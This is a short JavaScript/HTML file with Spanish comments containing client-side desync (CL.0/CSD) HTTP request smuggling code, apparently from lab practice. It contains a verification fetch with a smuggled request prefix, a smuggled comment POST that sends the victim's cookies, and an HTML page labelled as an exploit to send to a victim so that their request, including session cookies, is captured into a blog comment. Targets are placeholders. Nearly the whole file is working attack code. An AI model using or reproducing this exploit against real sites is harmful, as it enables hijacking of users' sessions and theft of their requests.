//Vericación CSD
fetch('https://..',{ //Petición de Ataque.
        method:'POST',
        body:'GET /404pls HTTP/1.1\r\nX-Foo: x', // Petición (prefijo) de contrabando.
        mode:'cors', //Con este recurso de origen cruzado se garantiza que el ID de conexión sea visible en la pestaña Red.
        credentials:'include' // Esto significa que se incluirán las cookies en la solicitud.
}).catch(() =>{
        fetch('https://..',{ //Petición Normal (home).
                mode:'no-cors',
                credentials:'include'

        })
})


//Verifación de envío de comentarios a través del navegador.
//Recordar que se deben cambiar los datos pertinentes (URLs y cabeceras del payload).
fetch('https://..',{ 
        method:'POST',
        body:'POST /en/post/comment HTTP/1.1\r\nHost: ..\r\nCookie: session=..;\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 900\r\nConnection: keep-alive\r\n\r\ncsrf=..&postId=(num)&name=tin3r&email=tin3r%40mail.com&website=&comment=xd',
        mode:'cors',
        credentials:'include'
}).catch (() => {
        fetch('https://..',{ 
                mode:'no-cors',
                credentials:'include'

        })
})


//Exploit para enviar a la víctima
<html>
        <h1>HTTP Request Smuggling</h1>
        <h2>PRUEBA CL.0 Y CSD</h2>
        <script>

fetch('https://..',{ 
        method:'POST',
        body:'POST /en/post/comment HTTP/1.1\r\nHost: ..\r\nCookie: session=..;\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 900\r\nConnection: keep-alive\r\n\r\ncsrf=..&postId=(num)&name=tin3r&email=tin3r%40mail.com&website=&comment=xd',
        mode:'cors',
        credentials:'include'
}).catch(() => {
        fetch('https://..',{ 
                mode:'no-cors',
                credentials:'include'

        })
})
        </script>
</html>
